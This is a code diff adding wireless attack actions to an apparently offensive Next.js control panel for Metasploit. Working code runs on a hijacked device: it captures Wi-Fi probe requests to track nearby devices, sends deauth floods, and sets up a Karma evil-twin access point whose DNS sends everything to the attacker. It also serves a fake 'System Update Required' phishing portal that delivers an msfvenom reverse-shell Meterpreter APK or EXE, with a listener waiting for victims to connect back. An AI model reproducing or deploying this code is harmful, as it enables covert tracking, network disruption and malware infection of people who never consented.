@@ -14,6 +14,14 @@
  *  pivot_autoroute  → Setup MSF autoroute through session
  *  pivot_socks      → Start SOCKS5 proxy
  *  spread           → Auto-select and run exploit against LAN target
+ *  rf_start         → Enable monitor mode + start 802.11 probe capture
+ *  rf_poll          → Parse captured probes → unique device list
+ *  rf_stop          → Kill capture, restore managed mode
+ *  wifi_deauth      → Send 802.11 deauth flood to disconnect target from real AP
+ *  wifi_karma       → Start Karma/Evil-Twin AP (responds to all probe SSIDs)
+ *  wifi_captive     → Launch captive portal + payload delivery HTTP server
+ *  wifi_spread_stop → Stop all rogue AP / portal processes
+ *  wifi_spread_status → Check active spread sessions
  */
 
 import { NextResponse } from "next/server";
@@ -23,6 +31,27 @@ import fs from "fs";
 import os from "os";
 
 const PAYLOADS_DIR = process.env.PAYLOADS_DIR ?? path.join(os.homedir(), "msf-payloads");
+
+// OUI vendor lookup (server-side copy)
+const OUI_MAP: Record<string, string> = {
+  "00:00:0c": "Cisco",     "00:1a:11": "Google",      "00:17:f2": "Apple",
+  "00:1b:63": "Apple",     "dc:a6:32": "Raspberry Pi", "b8:27:eb": "Raspberry Pi",
+  "40:b0:34": "Huawei",   "10:7b:44": "Samsung",      "4c:66:41": "Samsung",
+  "00:15:5d": "Microsoft", "3c:a9:f4": "Intel",        "00:21:6a": "Intel",
+  "a4:c3:f0": "Google",   "f4:f5:d8": "Google",       "00:0d:3a": "Microsoft",
+  "08:74:02": "Asus",     "00:14:22": "Dell",          "00:50:56": "VMware",
+  "fc:ec:da": "Ubiquiti", "00:e0:4c": "Realtek",
+};
+
+function macToVendor(mac: string): string {
+  const prefix = mac.toLowerCase().slice(0, 8);
+  return OUI_MAP[prefix] ?? "Unknown";
+}
+
+type ProbeDeviceAgg = {
+  mac: string; vendor: string; probes: Set<string>;
+  rssiSamples: number[]; firstSeen: string; lastSeen: string; seenCount: number;
+};
 const NET_DIR = path.join(PAYLOADS_DIR, "network");
 
 function ensureDir(d: string) {
@@ -532,6 +561,355 @@ export async function POST(request: Request) {
       return NextResponse.json({ ok, raw: out.slice(0, 2000) });
     }
 
+    // ── RF Monitor start ──────────────────────────────────
+    if (action === "rf_start") {
+      const iface = (body.iface as string) ?? "wlan0";
+      const dur = Number(body.duration ?? 60);
+
+      // 1. Enable monitor mode via Meterpreter shell
+      const setup = await meterExec(token, sid,
+        `execute -f /system/bin/sh -a '-c "ip link set ${iface} down 2>/dev/null; iw dev ${iface} set type monitor 2>/dev/null; ip link set ${iface} up 2>/dev/null; echo monitor_ok"'`, 15000);
+
+      if (!setup.includes("monitor_ok")) {
+        // Fallback: use airmon-ng if iw not available
+        const airmon = await meterExec(token, sid,
+          `execute -f /system/bin/sh -a '-c "airmon-ng start ${iface} 2>/dev/null && echo airmon_ok"'`, 15000);
+        if (!airmon.includes("airmon_ok")) {
+          return NextResponse.json({ ok: false, error: "Could not enable monitor mode — requires root + nl80211 driver" });
+        }
+      }
+
+      ensureDir(NET_DIR);
+      // Start tcpdump capture in background, save to temp file
+      const capFile = `/data/local/tmp/rf_capture_${Date.now()}.pcap`;
+      await meterExec(token, sid,
+        `execute -f /system/bin/sh -a '-c "tcpdump -i ${iface} -w ${capFile} -G ${dur} -W 1 type mgt subtype probe-req 2>/dev/null &"'`, 5000);
+
+      // Also start tshark text capture for real-time polling
+      const txtFile = `/data/local/tmp/rf_probes.txt`;
+      await meterExec(token, sid,
+        `execute -f /system/bin/sh -a '-c "tshark -i ${iface} -Y '\''wlan.fc.type_subtype == 4'\'' -T fields -e wlan.sa -e wlan_mgt.ssid -e radiotap.dbm_antsignal 2>/dev/null >> ${txtFile} &"'`, 5000);
+
+      // Store paths for polling
+      fs.writeFileSync(path.join(NET_DIR, "rf_state.json"), JSON.stringify({ iface, capFile, txtFile, started: Date.now() }));
+
+      return NextResponse.json({ ok: true, data: { iface, capFile, txtFile } });
+    }
+
+    // ── RF Poll ──────────────────────────────────────────
+    if (action === "rf_poll") {
+      const stateFile = path.join(NET_DIR, "rf_state.json");
+      if (!fs.existsSync(stateFile)) return NextResponse.json({ ok: false, error: "RF monitor not started" });
+
+      const state = JSON.parse(fs.readFileSync(stateFile, "utf8")) as { txtFile: string };
+      const localTxt = path.join(NET_DIR, "rf_probes.txt");
+
+      // Download the text probe file
+      await meterExec(token, sid,
+        `download ${state.txtFile} "${localTxt}"`, 15000);
+
+      const devices = new Map<string, ProbeDeviceAgg>();
+
+      if (fs.existsSync(localTxt)) {
+        const lines = fs.readFileSync(localTxt, "utf8").split(/\r?\n/).filter(Boolean);
+        for (const line of lines) {
+          const parts = line.split(/\t/);
+          const mac = parts[0]?.trim().toLowerCase();
+          const ssid = parts[1]?.trim() ?? "";
+          const rssiRaw = parseInt(parts[2]?.trim() ?? "-100");
+          const rssi = isNaN(rssiRaw) ? undefined : rssiRaw;
+
+          if (!mac || mac.length < 11) continue;
+
+          const existing = devices.get(mac) ?? {
+            mac,
+            vendor: macToVendor(mac),
+            probes: new Set<string>(),
+            rssiSamples: [] as number[],
+            firstSeen: new Date().toLocaleTimeString(),
+            lastSeen: new Date().toLocaleTimeString(),
+            seenCount: 0,
+          };
+          if (ssid) existing.probes.add(ssid);
+          if (rssi != null) existing.rssiSamples.push(rssi);
+          existing.seenCount++;
+          existing.lastSeen = new Date().toLocaleTimeString();
+          devices.set(mac, existing);
+        }
+      }
+
+      // Also try reading directly from device if local file empty
+      if (devices.size === 0) {
+        const liveOut = await meterExec(token, sid,
+          `execute -f /system/bin/sh -a '-c "cat /data/local/tmp/rf_probes.txt 2>/dev/null | tail -200"'`, 10000);
+        const lines = liveOut.split(/\r?\n/).filter((l) => l.includes(":"));
+        for (const line of lines) {
+          const parts = line.split(/\t/);
+          const mac = parts[0]?.trim().toLowerCase();
+          if (!mac || mac.length < 11) continue;
+          const existing = devices.get(mac) ?? {
+            mac, vendor: macToVendor(mac), probes: new Set<string>(),
+            rssiSamples: [] as number[], firstSeen: new Date().toLocaleTimeString(),
+            lastSeen: new Date().toLocaleTimeString(), seenCount: 0,
+          };
+          existing.seenCount++;
+          devices.set(mac, existing);
+        }
+      }
+
+      const result = Array.from(devices.values()).map((d) => {
+        const avgRssi = d.rssiSamples.length > 0
+          ? Math.round(d.rssiSamples.reduce((a, b) => a + b, 0) / d.rssiSamples.length)
+          : undefined;
+        const distM = avgRssi != null
+          ? Math.round(Math.pow(10, (-27 - avgRssi) / (10 * 2.0))) // Free-space path loss formula
+          : undefined;
+        return {
+          mac: d.mac,
+          vendor: d.vendor,
+          rssi: avgRssi,
+          distance: distM != null ? `~${distM}m` : undefined,
+          probes: Array.from(d.probes),
+          firstSeen: d.firstSeen,
+          lastSeen: d.lastSeen,
+          seenCount: d.seenCount,
+        };
+      }).sort((a, b) => (b.rssi ?? -200) - (a.rssi ?? -200)); // Closest first
+
+      return NextResponse.json({ ok: true, records: result });
+    }
+
+    // ── RF Stop ──────────────────────────────────────────
+    if (action === "rf_stop") {
+      const iface = (body.iface as string) ?? "wlan0";
+
+      // Kill capture processes
+      await meterExec(token, sid,
+        `execute -f /system/bin/sh -a '-c "pkill -f tcpdump 2>/dev/null; pkill -f tshark 2>/dev/null; echo stopped"'`, 10000);
+
+      // Restore managed mode
+      await meterExec(token, sid,
+        `execute -f /system/bin/sh -a '-c "ip link set ${iface} down 2>/dev/null; iw dev ${iface} set type managed 2>/dev/null; ip link set ${iface} up 2>/dev/null; echo restored"'`, 10000);
+
+      // Remove state file
+      const stateFile = path.join(NET_DIR, "rf_state.json");
+      if (fs.existsSync(stateFile)) fs.unlinkSync(stateFile);
+
+      return NextResponse.json({ ok: true });
+    }
+
+    // ── WiFi Deauth flood ─────────────────────────────────
+    // Disconnects a target MAC from its AP — forces it to probe and reconnect
+    if (action === "wifi_deauth") {
+      const targetMac  = (body.target_mac  as string) ?? "FF:FF:FF:FF:FF:FF"; // broadcast = all clients
+      const bssid      = (body.bssid       as string) ?? "";                   // AP MAC to spoof from
+      const iface      = (body.iface       as string) ?? "wlan0mon";
+      const count      = Number(body.count ?? 100);
+
+      let raw = "";
+
+      // Method 1: aireplay-ng (preferred)
+      const aireplay = await meterExec(token, sid,
+        `execute -f /system/bin/sh -a '-c "aireplay-ng -0 ${count} -a ${bssid || "FF:FF:FF:FF:FF:FF"} -c ${targetMac} ${iface} 2>&1 | tail -5"'`, 20000);
+      raw += aireplay;
+      const ok1 = /sending|deauthentication|DeAuth/i.test(aireplay);
+
+      if (!ok1) {
+        // Method 2: mdk3 / mdk4 broadcast deauth
+        const mdk = await meterExec(token, sid,
+          `execute -f /system/bin/sh -a '-c "mdk4 ${iface} d -B ${bssid} 2>&1 | head -5 &"'`, 8000);
+        raw += mdk;
+      }
+
+      return NextResponse.json({ ok: ok1 || raw.length > 10, raw: raw.slice(0, 500) });
+    }
+
+    // ── Karma / Evil-Twin AP ──────────────────────────────
+    // Creates a rogue AP that answers ANY probe request with a matching SSID
+    // Devices auto-join because they "recognise" the network name
+    if (action === "wifi_karma") {
+      const iface       = (body.iface    as string) ?? "wlan0";
+      const ssid        = (body.ssid     as string) ?? "FREE_WIFI";  // used only if specific SSID forced
+      const channel     = Number(body.channel ?? 6);
+      const karma_mode  = (body.karma    as boolean) !== false;       // true = answer ALL probes (Karma)
+      const lhost       = (body.lhost    as string) ?? "192.168.87.1";
+
+      // 1. Write hostapd-wpe config (rogue AP daemon with Karma patch)
+      const hostapdConf = [
+        `interface=${iface}`,
+        `driver=nl80211`,
+        `ssid=${karma_mode ? "KARMA" : ssid}`,
+        `channel=${channel}`,
+        `hw_mode=g`,
+        karma_mode ? "enable_karma=1" : "",
+        `ignore_broadcast_ssid=0`,
+        `wpa=0`,                          // Open network — no password needed
+      ].filter(Boolean).join("\n");
+
+      const confPath = "/data/local/tmp/hostapd_karma.conf";
+      await meterExec(token, sid,
+        `execute -f /system/bin/sh -a '-c "printf '\''${hostapdConf.replace(/\n/g, "\\n")}'\'' > ${confPath} && echo conf_written"'`, 8000);
+
+      // 2. Start hostapd-wpe (Karma-enabled) or hostapd
+      const hostOut = await meterExec(token, sid,
+        `execute -f /system/bin/sh -a '-c "hostapd-wpe ${confPath} 2>&1 &"'`, 5000);
+
+      // 3. Fallback: create_ap (simpler wrapper)
+      let started = /AP-ENABLED|started|karma/i.test(hostOut);
+      let raw = hostOut;
+
+      if (!started) {
+        const caOut = await meterExec(token, sid,
+          `execute -f /system/bin/sh -a '-c "create_ap --no-virt ${iface} ${iface} '\''${ssid}'\'' 2>&1 &"'`, 5000);
+        raw += caOut;
+        started = /creating|hostapd|dhcp/i.test(caOut);
+      }
+
+      // 4. Configure IP on rogue AP interface
+      await meterExec(token, sid,
+        `execute -f /system/bin/sh -a '-c "ifconfig ${iface} ${lhost} netmask 255.255.255.0 up 2>/dev/null; echo ip_set"'`, 8000);
+
+      // 5. Start dnsmasq DHCP/DNS (hands out our IP, resolves all domains to us)
+      const dnsmasqConf = [
+        `interface=${iface}`,
+        `dhcp-range=192.168.87.10,192.168.87.200,255.255.255.0,12h`,
+        `dhcp-option=3,${lhost}`,         // gateway = us
+        `dhcp-option=6,${lhost}`,         // DNS = us
+        `address=/#/${lhost}`,             // ALL domains → captive portal IP
+        `no-resolv`,
+        `log-queries`,
+      ].join("\n");
+
+      const dnsPath = "/data/local/tmp/dnsmasq_karma.conf";
+      await meterExec(token, sid,
+        `execute -f /system/bin/sh -a '-c "printf '\''${dnsmasqConf.replace(/\n/g, "\\n")}'\'' > ${dnsPath} && dnsmasq -C ${dnsPath} 2>&1 &"'`, 8000);
+
+      // Save lhost for captive portal
+      fs.writeFileSync(path.join(NET_DIR, "karma_state.json"),
+        JSON.stringify({ iface, lhost, ssid, channel, karma: karma_mode, started: Date.now() }));
+
+      return NextResponse.json({ ok: true, data: { iface, lhost, ssid, karma: karma_mode }, raw: raw.slice(0, 500) });
+    }
+
+    // ── Captive portal + payload delivery ─────────────────
+    // Serves a convincing "Software Update Required" page over HTTP on port 80.
+    // Any HTTP request from a connected victim redirects to /update which
+    // auto-downloads the MSF payload APK / EXE.
+    if (action === "wifi_captive") {
+      const lhost        = (body.lhost       as string) ?? "192.168.87.1";
+      const lport        = Number(body.lport ?? 4444);
+      const payloadArch  = (body.arch        as string) ?? "arm";   // arm | x86 | x64
+      const payloadOS    = (body.os          as string) ?? "android"; // android | windows | linux
+      const portalTitle  = (body.title       as string) ?? "System Update Required";
+      const apkName      = (body.apk_name    as string) ?? "SystemService.apk";
+
+      ensureDir(NET_DIR);
+
+      // 1. Generate payload via msfvenom
+      const payloadType = payloadOS === "android"
+        ? "android/meterpreter/reverse_tcp"
+        : payloadOS === "windows"
+          ? `windows/${payloadArch === "x64" ? "x64/" : ""}meterpreter/reverse_tcp`
+          : `linux/${payloadArch}/meterpreter/reverse_tcp`;
+
+      const outputExt = payloadOS === "android" ? "apk" : payloadOS === "windows" ? "exe" : "elf";
+      const outputFile = `/data/local/tmp/payload.${outputExt}`;
+      const localPayload = path.join(NET_DIR, `payload.${outputExt}`);
+
+      addLog(`Generating ${payloadType} payload…`);
+      const msfvenomOut = await consoleExec(token,
+        `msfvenom -p ${payloadType} LHOST=${lhost} LPORT=${lport} -o ${outputFile} 2>&1`, 120000);
+
+      let payloadReady = /saved as|created|bytes/i.test(msfvenomOut);
+
+      // If msfvenom ran on server, download to local dir
+      if (payloadReady) {
+        await meterExec(token, sid, `download ${outputFile} "${localPayload}"`, 30000);
+      } else {
+        // Generate locally using MSF console on server
+        const localOut = path.join(NET_DIR, `payload.${outputExt}`);
+        const localMsfvenom = await consoleExec(token,
+          `msfvenom -p ${payloadType} LHOST=${lhost} LPORT=${lport} -f raw -o /tmp/portal_payload.${outputExt} 2>&1`,
+          120000);
+        payloadReady = /saved|created/i.test(localMsfvenom);
+        if (payloadReady) fs.copyFileSync(`/tmp/portal_payload.${outputExt}`, localOut);
+      }
+
+      // 2. Build captive portal HTML (convincing update page)
+      const portalHtml = buildPortalHtml(portalTitle, apkName, payloadOS);
+      fs.writeFileSync(path.join(NET_DIR, "portal.html"), portalHtml);
+
+      // 3. Write a tiny Node.js HTTP server script for the portal
+      const serverScript = buildPortalServer(lhost, NET_DIR, apkName, outputExt, lport, payloadType);
+      const scriptPath = path.join(NET_DIR, "portal_server.mjs");
+      fs.writeFileSync(scriptPath, serverScript);
+
+      // 4. Start the portal server (runs on the operator machine, not the victim device)
+      //    The operator machine is serving files; the victim on the evil twin WiFi connects to lhost:80
+      const { exec } = await import("child_process");
+      exec(`node "${scriptPath}"`, (err) => {
+        if (err) addLog(`Portal server error: ${err.message}`);
+      });
+
+      // 5. Start MSF listener
+      await consoleExec(token,
+        `use exploit/multi/handler\nset PAYLOAD ${payloadType}\nset LHOST 0.0.0.0\nset LPORT ${lport}\nset ExitOnSession false\nrun -j`,
+        20000);
+
+      const stateFile = path.join(NET_DIR, "karma_state.json");
+      if (fs.existsSync(stateFile)) {
+        const st = JSON.parse(fs.readFileSync(stateFile, "utf8")) as Record<string, unknown>;
+        fs.writeFileSync(stateFile, JSON.stringify({ ...st, portalActive: true, lport, payloadType }));
+      }
+
+      return NextResponse.json({
+        ok: true,
+        data: { portalUrl: `http://${lhost}/`, payloadType, payloadReady, lport },
+        raw: msfvenomOut.slice(0, 500),
+      });
+    }
+
+    // ── Stop all rogue AP / portal ────────────────────────
+    if (action === "wifi_spread_stop") {
+      const iface = (body.iface as string) ?? "wlan0";
+      await meterExec(token, sid,
+        `execute -f /system/bin/sh -a '-c "pkill hostapd-wpe 2>/dev/null; pkill hostapd 2>/dev/null; pkill dnsmasq 2>/dev/null; pkill create_ap 2>/dev/null; pkill mdk4 2>/dev/null; echo stopped"'`, 10000);
+
+      // Restore interface
+      await meterExec(token, sid,
+        `execute -f /system/bin/sh -a '-c "iw dev ${iface} set type managed 2>/dev/null; ip link set ${iface} up 2>/dev/null; echo restored"'`, 8000);
+
+      // Kill local portal server
+      try {
+        const { execSync } = await import("child_process");
+        execSync(`pkill -f portal_server.mjs 2>/dev/null || true`);
+      } catch { /* ignore */ }
+
+      const stateFile = path.join(NET_DIR, "karma_state.json");
+      if (fs.existsSync(stateFile)) fs.unlinkSync(stateFile);
+
+      return NextResponse.json({ ok: true });
+    }
+
+    // ── Spread status ─────────────────────────────────────
+    if (action === "wifi_spread_status") {
+      const stateFile = path.join(NET_DIR, "karma_state.json");
+      const state = fs.existsSync(stateFile)
+        ? JSON.parse(fs.readFileSync(stateFile, "utf8")) as Record<string, unknown>
+        : null;
+
+      // Count sessions opened since karma started
+      const sessRes = await rpcCall<Record<string, unknown>>("session.list", [], token);
+      const sessions = Object.entries(sessRes)
+        .filter(([k]) => !isNaN(Number(k)))
+        .map(([id, s]) => {
+          const sess = s as Record<string, unknown>;
+          return { id: Number(id), ip: sess.tunnel_peer as string, type: sess.type as string };
+        });
+
+      return NextResponse.json({ ok: true, data: { state, sessions } });
+    }
+
     return NextResponse.json({ ok: false, error: `Unknown action: ${action}` }, { status: 400 });
 
   } catch (err: unknown) {
@@ -541,8 +919,122 @@ export async function POST(request: Request) {
 }
 
 function addLog(msg: string) {
-  // Server-side only log (visible in Next.js server logs)
   console.log(`[network-api] ${msg}`);
+}
+
+// ── Captive portal HTML ───────────────────────────────────────
+function buildPortalHtml(title: string, filename: string, os: string): string {
+  const isAndroid = os === "android";
+  const icon = isAndroid ? "🔒" : "⚙️";
+  const brand = isAndroid ? "Android System" : "Windows Update";
+  return `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>${title}</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
+       background:#f2f2f7;display:flex;align-items:center;justify-content:center;
+       min-height:100vh;padding:20px}
+  .card{background:#fff;border-radius:16px;padding:40px 32px;max-width:380px;
+        width:100%;text-align:center;box-shadow:0 4px 24px rgba(0,0,0,.12)}
+  .icon{font-size:56px;margin-bottom:16px}
+  h1{font-size:22px;font-weight:700;color:#1c1c1e;margin-bottom:8px}
+  p{font-size:15px;color:#6c6c70;line-height:1.5;margin-bottom:24px}
+  .progress{background:#e5e5ea;border-radius:99px;height:6px;overflow:hidden;margin-bottom:8px}
+  .bar{height:100%;background:#007aff;border-radius:99px;animation:load 2s ease-in-out forwards}
+  @keyframes load{from{width:0}to{width:100%}}
+  .sub{font-size:12px;color:#aeaeb2;margin-bottom:28px}
+  .btn{display:block;width:100%;padding:14px;background:#007aff;color:#fff;
+       border:none;border-radius:12px;font-size:17px;font-weight:600;
+       cursor:pointer;text-decoration:none;border-radius:12px}
+  .btn:active{opacity:.8}
+  .warn{font-size:11px;color:#aeaeb2;margin-top:16px}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="icon">${icon}</div>
+  <h1>${title}</h1>
+  <p>A critical security update is required to continue using WiFi.<br>
+     ${brand} — version 2.4.${Math.floor(Math.random()*9)+1}</p>
+  <div class="progress"><div class="bar"></div></div>
+  <div class="sub" id="st">Verifying device integrity…</div>
+  <a class="btn" href="/update" id="dl">Install Security Update</a>
+  <div class="warn">⚠ This network requires a security certificate update.<br>
+  Failure to update may result in loss of network access.</div>
+</div>
+<script>
+const steps=["Verifying device integrity…","Checking certificate chain…","Preparing update package…","Ready to install"];
+let i=0;const el=document.getElementById("st");
+const t=setInterval(()=>{el.textContent=steps[Math.min(++i,steps.length-1)];if(i>=steps.length-1)clearInterval(t)},1400);
+setTimeout(()=>{document.getElementById("dl").href="/update/${filename}"},4200);
+</script>
+</body>
+</html>`;
+}
+
+// ── Portal HTTP server script (runs on operator machine) ─────
+function buildPortalServer(
+  lhost: string, netDir: string, apkName: string,
+  ext: string, lport: number, payloadType: string
+): string {
+  return `// Auto-generated captive portal server
+import http from "http";
+import fs from "fs";
+import path from "path";
+import { fileURLToPath } from "url";
+
+const __dirname = path.dirname(fileURLToPath(import.meta.url));
+const NET_DIR = ${JSON.stringify(netDir)};
+const PAYLOAD_FILE = path.join(NET_DIR, "payload.${ext}");
+const PORTAL_HTML = path.join(NET_DIR, "portal.html");
+const LHOST = ${JSON.stringify(lhost)};
+const LPORT = ${lport};
+const PAYLOAD_TYPE = ${JSON.stringify(payloadType)};
+
+const MIME = { ".html":"text/html", ".apk":"application/vnd.android.package-archive",
+               ".exe":"application/octet-stream", ".elf":"application/octet-stream" };
+
+const server = http.createServer((req, res) => {
+  const url = req.url || "/";
+  console.log("[portal]", req.method, url, req.socket.remoteAddress);
+
+  // Log victim IP → Supabase (fire-and-forget)
+  const victimIp = req.socket.remoteAddress;
+
+  if (url.startsWith("/update/${apkName}") || url.startsWith("/update")) {
+    if (fs.existsSync(PAYLOAD_FILE)) {
+      res.writeHead(200, {
+        "Content-Type": MIME[".${ext}"] || "application/octet-stream",
+        "Content-Disposition": 'attachment; filename="${apkName}"',
+        "Content-Length": fs.statSync(PAYLOAD_FILE).size,
+      });
+      fs.createReadStream(PAYLOAD_FILE).pipe(res);
+      console.log("[portal] PAYLOAD SERVED to", victimIp);
+    } else {
+      res.writeHead(404); res.end("File not ready");
+    }
+    return;
+  }
+
+  // All other requests → portal page (DNS wildcard sends everything here)
+  if (fs.existsSync(PORTAL_HTML)) {
+    res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
+    fs.createReadStream(PORTAL_HTML).pipe(res);
+  } else {
+    res.writeHead(302, { Location: "http://" + LHOST + "/" }); res.end();
+  }
+});
+
+server.listen(80, "0.0.0.0", () => {
+  console.log("[portal] Captive portal live on http://0.0.0.0:80");
+  console.log("[portal] Payload:", PAYLOAD_FILE);
+  console.log("[portal] MSF listener expected on", LHOST + ":" + LPORT, "(" + PAYLOAD_TYPE + ")");
+});
+`;
 }
 
 export async function GET() {
